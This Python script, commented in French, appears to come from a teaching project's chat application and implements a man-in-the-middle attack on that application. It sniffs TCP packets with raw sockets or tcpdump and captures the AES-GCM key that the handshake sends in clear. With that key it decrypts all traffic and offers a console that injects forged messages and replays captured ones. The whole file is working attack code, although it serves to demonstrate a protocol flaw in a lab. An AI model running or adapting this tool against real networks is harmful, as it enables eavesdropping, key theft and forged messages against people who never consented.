"""LSJkash - Attaque Man-in-the-Middle (Etape 5).

Sniffe le trafic TCP sur le port du serveur, intercepte la cle AES-GCM
envoyee en clair dans le handshake, dechiffre tous les messages en
temps reel, et permet d'injecter des faux messages.

Aucune modification du serveur ou du client n'est necessaire.

Scenario :
    1. Le serveur tourne normalement :  python3 server/server.py (port 5000)
    2. Des clients se connectent :      python3 client/client.py
    3. L'attaquant sniffe et attaque :  sudo python3 attack/mitm.py
"""

import os
import socket
import struct
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from crypto.aes_gcm import decrypt_message, encrypt_message, import_key  # noqa: E402

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

stolen_key = None
cipher_type = None
captured = []
lock = threading.Lock()
server_host = None
server_port = None


def log(tag, msg, color=CYAN):
    print(f"{color}[{tag}]{RESET} {msg}")


def decrypt_stolen(data_str):
    """Dechiffre avec la cle volee."""
    if stolen_key is None:
        return None
    try:
        return decrypt_message(data_str.strip(), stolen_key)
    except Exception:
        return None


def process_payload(payload, src_port, dst_port):
    """Analyse un payload TCP intercepte."""
    global stolen_key, cipher_type

    try:
        text = payload.decode("utf-8", errors="ignore")
    except Exception:
        return

    if not text.strip():
        return

    # Detection du handshake CIPHER:type:key
    if text.startswith("CIPHER:"):
        parts = text.strip().split(":", 2)
        cipher_type = parts[1] if len(parts) > 1 else "?"
        key_str = parts[2] if len(parts) > 2 else ""

        print()
        log("SNIFF", f"{RED}{BOLD}{'='*45}{RESET}")
        log("SNIFF", f"{RED}{BOLD}   CLE INTERCEPTEE (handshake en clair){RESET}")
        log("SNIFF", f"{RED}{BOLD}{'='*45}{RESET}")
        log("SNIFF", f"Type       : {cipher_type}")

        if cipher_type == "aesgcm" and key_str:
            stolen_key = import_key(key_str)
            log("SNIFF", f"Cle (b64)  : {key_str}")
            log("SNIFF", f"Cle (hex)  : {stolen_key.hex()}")
            log("SNIFF", f"Taille     : {len(stolen_key)*8} bits")
        elif key_str:
            log("SNIFF", f"Cle        : {key_str}")

        log("SNIFF", f"{RED}{BOLD}{'='*45}{RESET}")
        print()
        return

    # Dechiffrement des messages
    clear = decrypt_stolen(text)
    if clear:
        direction = "C->S" if dst_port == server_port else "S->C"
        log(direction, f"chiffre: {text.strip()[:50]}...", YELLOW)
        log(direction, f"clair  : {GREEN}{clear}{RESET}", GREEN)
        with lock:
            captured.append((direction, clear, text.strip()))


def sniff_raw(interface, port):
    """Sniffe les paquets TCP sur une interface avec des raw sockets."""
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
        sock.bind((interface, 0))
    except PermissionError:
        log("ERR", "Besoin de root pour sniffer. Relancez avec sudo.", RED)
        sys.exit(1)
    except OSError as e:
        log("ERR", f"Impossible d'ouvrir l'interface '{interface}': {e}", RED)
        sys.exit(1)

    log("SNIFF", f"Capture sur {interface}, filtre TCP port {port}")
    log("SNIFF", "En attente de trafic...\n")

    while True:
        try:
            raw, addr_info = sock.recvfrom(65535)
        except OSError:
            break

        # Sur loopback, chaque paquet apparait 2 fois (OUTGOING + HOST).
        # On ne garde que PACKET_OUTGOING (pkttype=4) pour eviter les doublons.
        if len(addr_info) >= 3 and addr_info[2] != 4:
            continue

        # Ethernet header: 14 bytes
        if len(raw) < 14:
            continue
        eth_proto = struct.unpack("!H", raw[12:14])[0]
        if eth_proto != 0x0800:  # IPv4
            continue

        # IP header
        ip_header = raw[14:34]
        if len(ip_header) < 20:
            continue
        ihl = (ip_header[0] & 0x0F) * 4
        protocol = ip_header[9]
        if protocol != 6:  # TCP
            continue

        ip_start = 14
        tcp_start = ip_start + ihl

        # TCP header
        if len(raw) < tcp_start + 20:
            continue
        src_port_pkt = struct.unpack("!H", raw[tcp_start:tcp_start + 2])[0]
        dst_port_pkt = struct.unpack("!H", raw[tcp_start + 2:tcp_start + 4])[0]

        # Filtrer sur le port cible
        if src_port_pkt != port and dst_port_pkt != port:
            continue

        tcp_offset = ((raw[tcp_start + 12] >> 4) & 0x0F) * 4
        payload_start = tcp_start + tcp_offset
        payload = raw[payload_start:]

        if len(payload) > 0:
            process_payload(payload, src_port_pkt, dst_port_pkt)


def sniff_tcpdump(port):
    """Fallback : sniffe via tcpdump si les raw sockets ne marchent pas."""
    import subprocess

    log("SNIFF", f"Mode tcpdump sur port {port}")

    proc = subprocess.Popen(
        ["tcpdump", "-i", "lo", "-l", "-A", f"tcp port {port}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True,
    )

    buffer = ""
    try:
        for line in proc.stdout:
            # tcpdump -A affiche le payload en ASCII apres les headers
            if line.startswith("CIPHER:") or (stolen_key and len(line.strip()) > 20):
                process_payload(line.strip().encode(), 0, port)
    except KeyboardInterrupt:
        proc.kill()


def inject_message(username, text):
    """Se connecte au serveur et injecte un faux message."""
    if stolen_key is None:
        log("ERR", "Pas de cle interceptee", RED)
        return

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((server_host, server_port))

        # Recevoir le handshake (on l'ignore, on a deja la cle)
        sock.recv(4096)
        time.sleep(0.2)

        # Envoyer le message chiffre avec la cle volee
        payload = f"[{username}] {text}"
        encrypted = encrypt_message(payload, stolen_key)
        sock.sendall(encrypted.encode())
        time.sleep(0.3)

        log("INJECT", f"Envoye: {GREEN}{payload}{RESET}", RED)
        sock.close()
    except Exception as e:
        log("ERR", f"Injection echouee: {e}", RED)


def replay(index=None):
    """Rejoue un message capture en le renvoyant au serveur."""
    with lock:
        if not captured:
            log("ERR", "Aucun message capture", RED)
            return
        idx = index if index is not None else len(captured) - 1
        if idx < 0 or idx >= len(captured):
            log("ERR", f"Index invalide (0-{len(captured)-1})", RED)
            return
        _, clear, encrypted = captured[idx]

    log("REPLAY", f"#{idx}: {clear}", YELLOW)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((server_host, server_port))
        sock.recv(4096)
        time.sleep(0.2)
        sock.sendall(encrypted.encode())
        time.sleep(0.3)
        log("REPLAY", "Message rejoue!", GREEN)
        sock.close()
    except Exception as e:
        log("ERR", f"Replay echoue: {e}", RED)


def show_captured():
    """Affiche les messages interceptes."""
    with lock:
        if not captured:
            print("  Aucun message")
            return
        print(f"\n  {BOLD}{len(captured)} messages interceptes:{RESET}")
        for i, (direction, clear, _) in enumerate(captured):
            print(f"  {CYAN}[{i:3d}]{RESET} {direction} : {clear}")
    print()


def show_key():
    """Affiche la cle volee."""
    if stolen_key:
        import base64
        log("KEY", f"Type     : {cipher_type}")
        log("KEY", f"Hex      : {stolen_key.hex()}")
        log("KEY", f"Base64   : {base64.b64encode(stolen_key).decode()}")
        log("KEY", f"Taille   : {len(stolen_key)*8} bits")
    else:
        log("KEY", "Aucune cle interceptee", YELLOW)


def menu():
    """Console d'attaque."""
    print(f"""
{BOLD}{'='*50}
  Commandes:
{'='*50}{RESET}
  {CYAN}inject{RESET}  <pseudo> <message>  - Injecter un faux message
  {CYAN}replay{RESET}  [index]             - Rejouer un message capture
  {CYAN}list{RESET}                        - Messages interceptes
  {CYAN}key{RESET}                         - Cle volee
  {CYAN}quit{RESET}                        - Quitter
""")

    while True:
        try:
            raw = input(f"{RED}mitm>{RESET} ").strip()
        except (KeyboardInterrupt, EOFError):
            print()
            break

        if not raw:
            continue

        parts = raw.split(None, 2)
        cmd = parts[0].lower()

        if cmd == "inject" and len(parts) >= 3:
            inject_message(parts[1], parts[2])
        elif cmd == "inject":
            username = input("  Pseudo: ").strip()
            text = input("  Message: ").strip()
            if username and text:
                inject_message(username, text)

        elif cmd == "replay":
            idx = int(parts[1]) if len(parts) > 1 else None
            replay(idx)

        elif cmd in ("list", "ls"):
            show_captured()

        elif cmd == "key":
            show_key()

        elif cmd in ("quit", "exit", "q"):
            break

        else:
            log("ERR", f"Commande inconnue: {cmd}", RED)


def main():
    global server_host, server_port

    print(f"""
{RED}{BOLD}{'='*50}
  LSJkash - MITM Sniffer + Injector
  Etape 5 - Man in the Middle
{'='*50}{RESET}
""")

    target = input(
        "Serveur cible (host:port) [127.0.0.1:5000]: "
    ).strip() or "127.0.0.1:5000"
    parts = target.rsplit(":", 1)
    server_host = parts[0]
    server_port = int(parts[1]) if len(parts) > 1 else 5000

    iface = input("Interface reseau [lo]: ").strip() or "lo"

    print()
    log("CONF", f"Cible   : {server_host}:{server_port}")
    log("CONF", f"Sniff   : {iface}")
    log("CONF", "Aucune modification du serveur ou du client.")
    print()

    # Lancer le sniffer en background
    sniff_thread = threading.Thread(
        target=sniff_raw, args=(iface, server_port), daemon=True
    )
    sniff_thread.start()

    # Attendre la cle
    log("WAIT", "En attente d'un handshake client-serveur...")
    while stolen_key is None:
        time.sleep(0.5)

    menu()


if __name__ == "__main__":
    main()
